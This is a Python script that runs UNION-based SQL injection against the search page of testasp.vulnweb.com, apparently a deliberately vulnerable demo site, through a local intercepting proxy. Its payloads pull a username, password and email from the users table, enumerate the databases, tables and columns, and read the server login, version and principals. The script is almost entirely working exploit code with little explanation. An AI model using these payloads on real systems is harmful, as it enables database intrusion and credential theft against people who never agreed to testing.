#!/usr/bin/env python3
"""Round 7 보강 3 — UNION 페이지 가시 추출로 DB 구조/자격증명 1건 확인 (읽기 전용)."""
import os
import subprocess
import urllib.parse

BASE = "http://testasp.vulnweb.com"
PROXY = ["-x", "http://127.0.0.1:8080",
         "--cacert", "/home/taeuk/.mitmproxy/mitmproxy-ca-cert.pem"]
J = "/home/taeuk/projects/llm-abliteration/hermes-harness/journal/web/testphp-vulnweb-test"
SCR = f"{J}/scratch/r7"
EVI = f"{J}/evidence/r7"
os.makedirs(EVI, exist_ok=True)

NAMES = ["postid(bogus)", "poster", "title", "message", "forumid", "threadid",
         "postdate", "avatar", "ttitle", "name"]


def run(url, body_out):
    cmd = ["curl", "-s", "-S"] + PROXY + [
        "-m", "60", "-D", f"{SCR}/_h.tmp", "-o", body_out,
        "-w", "%{http_code} %{size_download} %{time_total}", url]
    r = subprocess.run(cmd, capture_output=True, text=True)
    try:
        body = open(body_out, "rb").read().decode("latin-1")
    except OSError:
        body = ""
    return (r.stdout or "").strip(), body


def render_row(body):
    """렌더된 결과 행에서 컬럼별 값을 위치 기반으로 뽑는다."""
    out = {}
    i = body.find("posted by")
    if i >= 0:
        j = body.find("</b>", i)
        out["poster"] = body[i + 9:j].strip()
    for key, div in (("title", "posttitle"), ("message", "posttext")):
        k = f"{div}'>"
        i = body.find(k)
        if i >= 0:
            j = body.find("</div>", i)
            out[key] = body[i + len(k):j].strip()
    return out


def union(select_list, tag):
    st = "q')>0) UNION ALL SELECT " + select_list + "--"
    url = f"{BASE}/Search.asp?tfSearch=" + urllib.parse.quote(st, safe="")
    info, body = run(url, f"{SCR}/U_{tag}.html")
    with open(f"{EVI}/r7_search_union_{tag}.html", "w", encoding="latin-1") as f:
        f.write(body)
    print(f"--- [{tag}] {info}")
    print(f"    payload tail: {st}")
    for k, v in render_row(body).items():
        print(f"    {k:8} = {v}")
    return body


print("U4. users 테이블 1건 (uname/upass/email/realname) — 최소 추출")
union("1,(SELECT TOP 1 uname FROM users),(CAST((SELECT TOP 1 upass FROM users) AS nvarchar(100)))"
      ",(CAST((SELECT TOP 1 email FROM users) AS nvarchar(200))),1,1,GETDATE(),'A','TT','FN'", "row1")
union("1,(SELECT TOP 1 realname FROM users),(CAST((SELECT TOP 1 avatar FROM users) AS nvarchar(100)))"
      ",(CAST((SELECT COUNT(*) FROM users) AS nvarchar(20))),1,1,GETDATE(),'A','TT','FN'", "row1b")

print()
print("U5. DB/스키마 구조 (FOR XML PATH 로 문자열 합침)")
union("1,(SELECT STUFF((SELECT ','+name FROM sys.databases FOR XML PATH('')),1,1,''))"
      ",'T','M',1,1,GETDATE(),'A','TT','FN'", "databases")
union("1,(SELECT STUFF((SELECT ','+name FROM sys.tables FOR XML PATH('')),1,1,''))"
      ",'T','M',1,1,GETDATE(),'A','TT','FN'", "tables")
union("1,(SELECT STUFF((SELECT ','+name FROM sys.columns WHERE object_id=OBJECT_ID('users') FOR XML PATH('')),1,1,''))"
      ",'T','M',1,1,GETDATE(),'A','TT','FN'", "users_columns")
union("1,(SELECT STUFF((SELECT ','+name FROM sys.columns WHERE object_id=OBJECT_ID('posts') FOR XML PATH('')),1,1,''))"
      ",'T','M',1,1,GETDATE(),'A','TT','FN'", "posts_columns")

print()
print("U6. 서버/로그인 정보")
union("1,(SELECT SUSER_SNAME()),CAST((SELECT @@version) AS nvarchar(200)),(SELECT DB_NAME())"
      ",1,1,GETDATE(),'A','TT',(SELECT STUFF((SELECT ','+name FROM sys.server_principals WHERE type IN ('S','U','G') FOR XML PATH('')),1,1,''))", "server")
print()
print("done")
